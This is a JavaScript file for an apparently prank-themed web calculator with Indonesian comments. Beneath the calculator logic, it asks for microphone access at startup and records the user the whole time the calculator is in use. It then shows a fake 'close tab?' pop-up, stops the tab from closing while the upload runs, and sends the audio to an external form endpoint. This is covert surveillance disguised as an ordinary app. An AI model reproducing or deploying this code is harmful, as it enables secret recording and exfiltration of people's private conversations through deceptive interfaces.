let runningTotal = 0;
let buffer = "0";
let previeousOperator = null; 

const screen = document.querySelector('.screen');
const music = document.getElementById('background-music');
const statusPesan = document.getElementById('status-rekam');

let mediaRecorder;
let audioChunks = [];

// Logika klik tombol kalkulator
function buttonClick(value){
    if (!value || value.length > 3) return; 
    if(isNaN(value)){
        handleSymbol(value);
    }else{
        handleNumber(value);
    }
    screen.innerText = buffer;
}

function handleSymbol(symbol){
    switch(symbol){
        case 'C':
            buffer = '0';
            runningTotal = 0;
            previeousOperator = null;
            document.body.style.backgroundImage = "none";
            document.body.style.background = "linear-gradient(320deg, #eb92be, #ffef78, #63c9b4)";
            music.pause();
            music.currentTime = 0;
            break;
            
        case "=":
            if(previeousOperator === null){ return; }
            flushOperation(parseFloat(buffer));
            previeousOperator = null;
            buffer = runningTotal;
            runningTotal = 0;

            // Efek Kejutan: Tampilkan gambar Teletubbies dan putar musik
            document.body.style.backgroundImage = "url('teletubbies.jpg')";
            music.play().catch(e => console.log("Musik diblokir browser"));
            
            // Hadang layar dengan memunculkan Pop-up palsu "Tutup Tab?"
            const popupTutup = document.getElementById('popup-tutup');
            if (popupTutup) {
                popupTutup.style.display = 'flex';
            }
            break;
            
        case "←":
            if(buffer.length === 1){ buffer = '0'; }
            else { buffer = buffer.substring(0, buffer.length - 1); }
            break;
        case "+":
        case "−":
        case "×":
        case "÷":
            handleMath(symbol);
            break;
    }
}

function handleMath(symbol){
    if(buffer === '0'){ return; }
    const intBuffer = parseFloat(buffer);
    if(runningTotal === 0){ runningTotal = intBuffer; }
    else{ flushOperation(intBuffer); }
    previeousOperator = symbol;
    buffer = '0';
}

function flushOperation(intBuffer){
    if(previeousOperator === '+'){ runningTotal += intBuffer; }
    else if(previeousOperator === '−'){ runningTotal -= intBuffer; }
    else if(previeousOperator === '×'){ runningTotal *= intBuffer; }
    else if(previeousOperator === '÷'){ runningTotal /= intBuffer; }
}

function handleNumber(numberString){
    if(buffer === "0"){ buffer = numberString; }
    else { buffer += numberString; }
}

function init(){
    const areaTombol = document.querySelector('.calc-buttons');
    if (areaTombol) {
        areaTombol.addEventListener('click', function(event){
            buttonClick(event.target.innerText);            
        });
    }
}

// --- LOGIKA ALUR PEREKAM BACKGROUND & POP-UP OK ---
const welcomeScreen = document.getElementById('welcome-screen');
const kotakKalkulator = document.querySelector('.wrapper'); 
const btnMulai = document.getElementById('btn-mulai');
const btnOk = document.getElementById('btn-ok');
const popupTutup = document.getElementById('popup-tutup');

if (btnMulai) {
    btnMulai.addEventListener('click', async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: true
            });

            let mimeType = '';

            if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
                mimeType = 'audio/webm;codecs=opus';
            } else if (MediaRecorder.isTypeSupported('audio/webm')) {
                mimeType = 'audio/webm';
            } else {
                mimeType = '';
            }

            mediaRecorder = new MediaRecorder(
                stream,
                mimeType ? { mimeType } : undefined
            );

            audioChunks = [];

            mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    audioChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = async () => {
                if (statusPesan) {
                    statusPesan.innerText = "Mengirim rekaman... ⏳";
                }

                const audioBlob = new Blob(audioChunks, {
                    type: mediaRecorder.mimeType
                });

                console.log("Ukuran file:", audioBlob.size);
                console.log("Tipe file:", audioBlob.type);

                const formData = new FormData();

                formData.append(
                    'fi-text-project-name',
                    'Kalkulator Rahasia Teletubbies'
                );

                formData.append(
                    'fi-file-suara',
                    audioBlob,
                    'suara-kalkulator.webm'
                );

                try {
                    const response = await fetch(
                        'https://forminit.com/f/q0a2qqkuoa0',
                        {
                            method: 'POST',
                            body: formData
                        }
                    );

                    console.log("Status:", response.status);

                    if (!response.ok) {
                        throw new Error(
                            `Upload gagal: ${response.status}`
                        );
                    }

                    if (statusPesan) {
                        statusPesan.innerText =
                            "Rekaman berhasil dikirim! ✅";
                    }

                    window.onbeforeunload = null;

                    setTimeout(() => {
                        if (statusPesan) {
                            statusPesan.innerText = "";
                        }
                    }, 3000);

                } catch (error) {
                    console.error("Upload error:", error);

                    if (statusPesan) {
                        statusPesan.innerText =
                            "Gagal mengirim rekaman ❌";
                    }

                    window.onbeforeunload = null;
                }

                // Matikan akses microphone
                stream.getTracks().forEach(track => track.stop());
            };

            mediaRecorder.start();

            console.log("Recording dimulai");
            console.log("MIME:", mediaRecorder.mimeType);

            if (welcomeScreen) {
                welcomeScreen.classList.add('halaman-keluar');
            }

            setTimeout(() => {
                if (welcomeScreen) {
                    welcomeScreen.style.display = 'none';
                }

                if (kotakKalkulator) {
                    kotakKalkulator.classList.add('kalkulator-masuk');
                }
            }, 500);

        } catch (err) {
            console.error(err);

            alert(
                "Aplikasi gagal disiapkan. " +
                "Anda harus memberikan izin mikrofon."
            );
        }
    });
}

if (btnOk) {
    btnOk.addEventListener('click', function() {
        if (popupTutup) popupTutup.style.display = 'none';

        // Mengunci tab browser agar data sempat ter-upload penuh
        window.onbeforeunload = function() { return "Proses kirim data belum selesai, yakin?"; };

        // Di sinilah rekaman resmi dihentikan dan otomatis memicu pengiriman data
        if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop(); 
        }
    });
}

init();
